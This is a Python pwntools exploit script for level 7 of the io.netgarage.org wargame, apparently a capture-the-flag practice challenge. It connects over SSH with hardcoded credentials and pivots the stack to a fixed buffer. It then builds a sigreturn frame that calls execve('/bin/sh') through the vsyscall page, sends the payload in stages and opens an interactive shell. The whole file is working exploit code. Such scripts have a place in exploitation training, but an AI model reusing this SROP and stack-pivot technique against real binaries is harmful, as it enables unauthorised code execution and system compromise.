from pwn import *

context.clear(arch='amd64')


user = 'level7'
password = 'KRTqdkaQEd3Tq3PU'
port = 2264
host = 'io.netgarage.org'
filebase = '/levels/level07'

#function to pad and truncate strings as required
def pad(s, n):
	if len(s) > n:
		return s
	return s + 'P' * (n - len(s))

def trunc(s, n):
	return str(s)[:n]


s = ssh(user=user, host=host, port=port, password=password)
p = s.run([filebase])
# p = process('./level07')

#base pointers
new_rbp = p64(0x600910)
new_rbp1 = p64(0x600920)

#address of function calls
ret = p64(0x400530)
read = p64(0x400514)
syscall = p64(0xffffffffff600007)

#execve sig return frame
sigRet = SigreturnFrame()
sigRet.rax = 59  #execve Syscall number
sigRet.rdi = 0x600900 
sigRet.rsi = 0x0
sigRet.rdx = 0x0
sigRet.rsp = 0x600990 
sigRet.rip = 0xffffffffff600007 #address of syscall
             

raw_input("Press enter to move stack") 
p.send('A' * 16 + new_rbp + read) #move stack and call read again

raw_input("press enter to set up stack")

payload = pad('/bin/sh\x00', 0x10) + new_rbp1 + read + ret + syscall + str(sigRet) #call a read to set up new stack finally, then call sig return
p.send(payload) #enter our data onto new stack


raw_input("press enter to set up rax")
p.send('A' * 0x8 + trunc(ret, 0x7)) #set rax for sigreturn then run for syscall


p.interactive()#interactive console